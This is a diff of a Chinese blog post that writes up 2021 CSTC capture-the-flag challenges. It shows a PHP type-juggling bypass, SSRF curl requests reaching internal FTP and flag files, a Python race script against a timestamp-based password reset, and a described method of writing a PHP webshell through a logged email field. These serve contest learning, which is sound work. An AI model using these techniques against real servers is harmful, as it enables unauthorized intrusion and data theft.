@@ -22,7 +22,7 @@
 
   <!-- 页面元数据 -->
   
-  <title>2021CSTC网络安全技术大赛 Writeup (持续更新) - TARI TARI</title>
+  <title>2021CSTC网络安全技术大赛 Writeup - TARI TARI</title>
   
     <meta name="keywords" content="ctf,比赛">
   
@@ -367,7 +367,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       <h1 class="title">
-        2021CSTC网络安全技术大赛 Writeup (持续更新)
+        2021CSTC网络安全技术大赛 Writeup
       </h1>
       <div class='new-meta-box'>
         
@@ -382,10 +382,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           
         
           
-            <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-05-06T16:17:19+08:00">
+            <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-05-06T22:56:30+08:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：2021年5月6日 16:17</p>
+    <p>更新于：2021年5月6日 22:56</p>
   </a>
 </div>
 
@@ -396,7 +396,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <div class="new-meta-item browse leancloud">
     <a class='notlink'>
       
-      <div id="lc-pv" data-title="2021CSTC网络安全技术大赛 Writeup (持续更新)" data-path="/2021/05/06/2021CSTC-ctf/">
+      <div id="lc-pv" data-title="2021CSTC网络安全技术大赛 Writeup" data-path="/2021/05/06/2021CSTC-ctf/">
         <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
         <span id='number'><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
         次浏览
@@ -412,13 +412,13 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <div class="new-meta-item wordcount">
     <a class='notlink'>
       <i class="fas fa-keyboard fa-fw" aria-hidden="true"></i>
-      <p>字数：1.5k字</p>
+      <p>字数：2k字</p>
     </a>
   </div>
   <div class="new-meta-item readtime">
     <a class='notlink'>
       <i class="fas fa-hourglass-half fa-fw" aria-hidden="true"></i>
-      <p>时长：8分钟</p>
+      <p>时长：10分钟</p>
     </a>
   </div>
 
@@ -439,7 +439,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>web2和web3 感觉接近了，现把做出来的写上</p>
 <p>看看后面有复现环境会复现，没有的话看下其他师傅的写写复盘。</p>
 <p>由于web2和3实在没思路了，然后顺手解了2个简单的杂项。</p>
-<h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>代码</p>
+<p>这里要吐槽一点，为什么题目不是下发 docker 容器形式的，，这样别人如果 getshell 不就可以改代码逻辑搞破坏了吗？</p>
+<h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><p>代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span>=<span class="number">0</span>;<span class="variable">$v2</span>=<span class="number">0</span>;<span class="variable">$v3</span>=<span class="number">0</span>;</span><br><span class="line"><span class="variable">$a</span>=(<span class="keyword">array</span>)json_decode(@<span class="variable">$_GET</span>[<span class="string">&#x27;foo&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$a</span>))&#123;</span><br><span class="line">   is_numeric(@<span class="variable">$a</span>[<span class="string">&quot;bar1&quot;</span>])?<span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">   <span class="keyword">if</span>(@<span class="variable">$a</span>[<span class="string">&quot;bar1&quot;</span>])&#123;</span><br><span class="line">       (<span class="variable">$a</span>[<span class="string">&quot;bar1&quot;</span>]&gt;<span class="number">2021</span>)?<span class="variable">$v1</span>=<span class="number">1</span>:<span class="literal">NULL</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span>(is_array(@<span class="variable">$a</span>[<span class="string">&quot;bar2&quot;</span>]))&#123;</span><br><span class="line">       <span class="keyword">if</span>(count(<span class="variable">$a</span>[<span class="string">&quot;bar2&quot;</span>])!==<span class="number">5</span> <span class="keyword">OR</span> !is_array(<span class="variable">$a</span>[<span class="string">&quot;bar2&quot;</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>);</span><br><span class="line">       <span class="variable">$pos</span> = array_search(<span class="string">&quot;nudt&quot;</span>, <span class="variable">$a</span>[<span class="string">&quot;a2&quot;</span>]);</span><br><span class="line">       <span class="variable">$pos</span>===<span class="literal">false</span>?<span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">       <span class="keyword">foreach</span>(<span class="variable">$a</span>[<span class="string">&quot;bar2&quot;</span>] <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">           <span class="variable">$val</span>===<span class="string">&quot;nudt&quot;</span>?<span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="variable">$v2</span>=<span class="number">1</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;cat&#x27;</span>];</span><br><span class="line"><span class="variable">$d</span>=@<span class="variable">$_GET</span>[<span class="string">&#x27;dog&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(@<span class="variable">$c</span>[<span class="number">1</span>])&#123;</span><br><span class="line">   <span class="keyword">if</span>(!strcmp(<span class="variable">$c</span>[<span class="number">1</span>],<span class="variable">$d</span>) &amp;&amp; <span class="variable">$c</span>[<span class="number">1</span>]!==<span class="variable">$d</span>)&#123;</span><br><span class="line">       eregi(<span class="string">&quot;3|1|c&quot;</span>,<span class="variable">$d</span>.<span class="variable">$c</span>[<span class="number">0</span>])?<span class="keyword">die</span>(<span class="string">&quot;nope&quot;</span>):<span class="literal">NULL</span>;</span><br><span class="line">       strpos((<span class="variable">$c</span>[<span class="number">0</span>].<span class="variable">$d</span>), <span class="string">&quot;cstc2021&quot;</span>)?<span class="variable">$v3</span>=<span class="number">1</span>:<span class="literal">NULL</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v1</span> &amp;&amp; <span class="variable">$v2</span> &amp;&amp; <span class="variable">$v3</span>)&#123;</span><br><span class="line">   <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
 
 <p><code>bar1</code> 和 <code>bar2</code> 凑一下</p>
@@ -449,7 +450,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620179402871-7de7f9bc-40b2-48f9-8db4-dd88c7c814b8.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620179402871-7de7f9bc-40b2-48f9-8db4-dd88c7c814b8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
 <p>flag{c32b71bb4aa5c4b2e7a8453f012f9c3e}</p>
-<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>提示1：</p>
+<h2 id="easyweb2"><a href="#easyweb2" class="headerlink" title="easyweb2"></a>easyweb2</h2><p>提示1：</p>
 <blockquote>
 <p><a target="_blank" rel="noopener" href="http://49.232.167.183:30012/swagger-ui.html">http://49.232.167.183:30012/swagger-ui.html</a></p>
 </blockquote>
@@ -481,10 +482,30 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <p>服务端是java来的，但感觉禁用了 file 之类的协议，，</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620204707249-1ca690ca-7ca8-4e1b-b6aa-63e83810ee73.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620204707249-1ca690ca-7ca8-4e1b-b6aa-63e83810ee73.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
 <p>不过不知道怎样利用，，卡在这了</p>
+<p>2021.5.6 17:17 更新</p>
+<hr>
+<p>麻了，看了别人题解</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_51078229/article/details/116423096">https://blog.csdn.net/m0_51078229/article/details/116423096</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&quot;http://49.232.167.183:30012/home/index?url=http://127.0.0.1/flag.txt&quot;</span> -H <span class="string">&quot;accept: */*&quot;</span> -H <span class="string">&quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个 <code>flag.txt</code> 在哪是猜的还是哪里有提示的？要是因为猜不到文件名而做不出来也太那啥了。。</p>
+<p>2021.5.6 22:03 更新</p>
+<hr>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qyCraner/article/details/116459918">https://blog.csdn.net/qyCraner/article/details/116459918</a></p>
+<p>又找了个题解，发现发送请求请求 ftp 端口</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET <span class="string">&quot;http://49.232.167.183:30012/home/index?url=ftp://127.0.0.1:21/&quot;</span> -H  <span class="string">&quot;accept: */*&quot;</span> -H  <span class="string">&quot;Token: 9c618e664319512ef7db2d3c0672bee0&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>会返回文件信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rw-r--r--   1 root     root           39 Apr 30 09:56 flag.txt</span><br></pre></td></tr></table></figure>
+
+<p>然后在读取就好了….这个试起来有点小麻烦感觉， ，主要是不知道协议、IP和端口…而且题目速度访问速度贼慢，题目本身会保持连接，burp不方便fuzz，这一点感觉要找（弄）个工具</p>
 <h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>目录爆破得 <code>robots.txt</code> &gt; 然后访问 <code>PassOn</code> &gt;</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620195711423-cb1b5cc7-8c90-4173-9071-2d39973d8676.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620195711423-cb1b5cc7-8c90-4173-9071-2d39973d8676.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
 <p>&gt; 得到源码 <a target="_blank" rel="noopener" href="http://49.232.3.115:49496/PassOn/PassOnbackupDirect0ry/backup.zip">http://49.232.3.115:49496/PassOn/PassOnbackupDirect0ry/backup.zip</a></p>
-<p>结合 <code>reset.php</code> 源码</p>
+<p>结合源码<code>reset.php</code>， 其实密码就是时间戳部分，<code>sha1</code> 哈希，取前面 20位</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$password</span> = substr(hash(<span class="string">&#x27;sha1&#x27;</span>, gmdate(<span class="string">&quot;l jS \of F Y h:i:s A&quot;</span>)), <span class="number">0</span>, <span class="number">20</span>);</span><br></pre></td></tr></table></figure>
+
+<p>然后帐号和邮箱在 <code>css/style.css</code> 注释里</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620207860979-f4fa9f1b-2fe7-49d0-b6c7-cf3941de908d.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620207860979-f4fa9f1b-2fe7-49d0-b6c7-cf3941de908d.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
 <p>重置密码</p>
 <p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620207952070-efdfe4c2-fb78-4c51-a512-fc3d456b41a9.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1620207952070-efdfe4c2-fb78-4c51-a512-fc3d456b41a9.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
@@ -496,6 +517,12 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">flag = <span class="literal">False</span></span><br><span class="line">user = <span class="string">&#x27;Ptn4rdn&#x27;</span></span><br><span class="line">passwd = <span class="string">&#x27;&#x27;</span></span><br><span class="line">email = <span class="string">&#x27;Ptn4rdn@gmail.com&#x27;</span></span><br><span class="line">loginUrl = <span class="string">&#x27;http://49.232.3.115:49496/PassOn/login.php&#x27;</span></span><br><span class="line">resetPassUrl = <span class="string">&#x27;http://49.232.3.115:49496/PassOn/reset.php&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resetPasswd</span>():</span></span><br><span class="line">    <span class="keyword">global</span> passwd</span><br><span class="line">    resetData = &#123;</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: email,</span><br><span class="line">        <span class="string">&#x27;user&#x27;</span>: user,</span><br><span class="line">        <span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;reset&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    gmdate = requests.post(loginUrl, resetData).content[-<span class="number">86</span>:-<span class="number">49</span>]</span><br><span class="line">    sha1 = hashlib.sha1()</span><br><span class="line">    sha1.update(gmdate)</span><br><span class="line">    passwd = sha1.hexdigest()[:<span class="number">20</span>]</span><br><span class="line">    <span class="built_in">print</span>(passwd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    <span class="keyword">global</span> flag, passwd</span><br><span class="line">    loginData = &#123;</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: email,</span><br><span class="line">        <span class="string">&#x27;pass&#x27;</span>: passwd,</span><br><span class="line">        <span class="string">&#x27;submit&#x27;</span>: <span class="string">&#x27;submit&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res = requests.post(resetPassUrl, loginData)</span><br><span class="line">    <span class="keyword">if</span> res.headers.get(<span class="string">&#x27;Cookie&#x27;</span>, <span class="number">0</span>):</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line">        <span class="built_in">print</span>(passwd)</span><br><span class="line">        <span class="built_in">print</span>(res.headers)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> flag <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">    a = threading.Thread(target=resetPasswd)</span><br><span class="line">    b = threading.Thread(target=login)</span><br><span class="line">    a.start()</span><br><span class="line">    b.start()</span><br></pre></td></tr></table></figure>
 
 <p>不太行。。后面利用大概是有思路了，卡在登录这。。。</p>
+<p>2021.5.6 22:09 更新</p>
+<hr>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qyCraner/article/details/116459918">https://blog.csdn.net/qyCraner/article/details/116459918</a></p>
+<p>找了个题解，发现别人可以正常登录上去的。。不知道我哪步错了，请教一波做出来的师傅。。他也说我做的步骤没毛病，，晕了。</p>
+<p>登录进去后就比较简单了，记录失败日志会把邮箱记录到 <code>.php</code> 文件里，把邮箱写成马就行。主要是这个 <code>php</code> 文件，记录 <code>session</code> 信息，如果没登录访问不了这个马。写入马后连接拿flag就好了。</p>
+<h2 id="hackerweb"><a href="#hackerweb" class="headerlink" title="hackerweb"></a>hackerweb</h2><p>这题还没看，堵在第2和第3题了…看看有没有复现环境，主要是别人的wp不是很详细，也还没动手做。</p>
 <h2 id="RGB"><a href="#RGB" class="headerlink" title="RGB"></a>RGB</h2><p>文件为RGB三原色组合，尝试还原图片</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Crack</span>(<span class="params">n</span>):</span></span><br><span class="line">    flag = []</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="built_in">int</span>(n **<span class="number">0.5</span>)+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span>(n % each == <span class="number">0</span>):</span><br><span class="line">            <span class="built_in">print</span>(each,<span class="built_in">int</span>(n/each))</span><br><span class="line">            flag += [(each,<span class="built_in">int</span>(n/each))]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(flag) == <span class="number">1</span>:<span class="keyword">return</span> flag[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        choice = <span class="built_in">input</span>(<span class="string">&quot;选择第几组(0-%s):&quot;</span>%(<span class="built_in">len</span>(flag)-<span class="number">1</span>))</span><br><span class="line">        <span class="keyword">return</span> flag[<span class="built_in">int</span>(choice)]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Paint</span>(<span class="params">X,Y,listrgb</span>):</span></span><br><span class="line">    pic = Image.new(<span class="string">&quot;RGB&quot;</span>,(X, Y))</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,X):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span> (<span class="number">0</span>,Y):</span><br><span class="line">            temp = listrgb[i].split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">            pic.putpixel([x,y],(<span class="built_in">int</span>(temp[<span class="number">0</span>]),<span class="built_in">int</span>(temp[<span class="number">1</span>]),<span class="built_in">int</span>(temp[<span class="number">2</span>])))</span><br><span class="line">            i = i+<span class="number">1</span></span><br><span class="line">    pic.show()</span><br><span class="line">    <span class="comment">#pic.save(&quot;./flag%s.png&quot;%(X))</span></span><br><span class="line">listrgb = <span class="built_in">open</span>(<span class="string">&quot;code.txt&quot;</span>).readlines()</span><br><span class="line">X,Y = Crack(<span class="built_in">len</span>(listrgb))</span><br><span class="line">Paint(X,Y,listrgb)</span><br><span class="line">Paint(Y,X,listrgb)</span><br></pre></td></tr></table></figure>
 
@@ -610,7 +637,7 @@ user.js
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web1"><span class="toc-text">web1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web2"><span class="toc-text">web2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web3"><span class="toc-text">web3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RGB"><span class="toc-text">RGB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zip"><span class="toc-text">zip</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#easyweb"><span class="toc-text">easyweb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyweb2"><span class="toc-text">easyweb2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web3"><span class="toc-text">web3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hackerweb"><span class="toc-text">hackerweb</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RGB"><span class="toc-text">RGB</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zip"><span class="toc-text">zip</span></a></li></ol>
     </div>
   </section>
 
@@ -629,7 +656,7 @@ user.js
 <script>
   window.pdata={}
   pdata.ispage=true;
-  pdata.postTitle="2021CSTC网络安全技术大赛 Writeup (持续更新)";
+  pdata.postTitle="2021CSTC网络安全技术大赛 Writeup";
   pdata.commentPath="";
   pdata.commentPlaceholder="";
   // header 这里无论是否开启pjax都需要
